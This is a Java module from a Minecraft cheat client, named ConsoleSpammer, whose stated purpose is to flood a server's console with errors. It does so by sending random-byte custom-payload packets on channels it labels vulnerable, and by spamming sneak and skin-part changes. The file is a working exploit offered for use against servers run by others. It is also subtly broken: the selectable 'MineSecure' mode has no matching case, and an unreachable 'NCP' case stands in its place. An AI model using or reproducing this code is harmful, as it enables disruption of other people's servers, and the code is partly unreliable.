package me.aquavit.liquidsense.modules.exploit;

import io.netty.buffer.Unpooled;

import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.UpdateEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.IntegerValue;
import net.ccbluex.liquidbounce.value.ListValue;
import net.minecraft.entity.player.EnumPlayerModelParts;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.util.Random;

@ModuleInfo(name = "ConsoleSpammer", description = "Spams the console of the server with errors.", category = ModuleCategory.EXPLOIT)
public class ConsoleSpammer extends Module {

    private MSTimer timer = new MSTimer();
    private Random random = new Random();

    private ListValue modeValue = new ListValue("Mode", new String[] {"Payload", "MineSecure"}, "Payload");
    private IntegerValue delayValue = new IntegerValue("Delay", 0, 0, 500);
    private PacketBuffer payload = new PacketBuffer(Unpooled.buffer());
    private String[] vulnerableChannels = new String[]{"MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem"};

    public ConsoleSpammer() {
        byte[] rawPayload = new byte[random.nextInt(128)];
        random.nextBytes(rawPayload);
        this.payload.writeBytes(rawPayload);
    }

    @EventTarget
    public void onUpdate(UpdateEvent event) {
        if (!timer.hasTimePassed(delayValue.get())) return;

        switch (modeValue.get()){
            case "Payload":
                mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(this.vulnerableChannels[random.nextInt(this.vulnerableChannels.length)], this.payload));
                break;
            case "NCP": {
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.HAT, random.nextBoolean());
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.JACKET, random.nextBoolean());
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_PANTS_LEG, random.nextBoolean());
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_PANTS_LEG, random.nextBoolean());
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_SLEEVE, random.nextBoolean());
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_SLEEVE, random.nextBoolean());

                for (int i=0; i<=5;i++){
                    mc.getNetHandler().addToSendQueue(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.STOP_SNEAKING));
                    mc.getNetHandler().addToSendQueue(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.START_SNEAKING));
                }
                break;
            }
        }
    }

    @EventTarget
    public void onWorld(final WorldEvent e) {
        if (e.getWorldClient() == null) this.setState(false);
    }
}
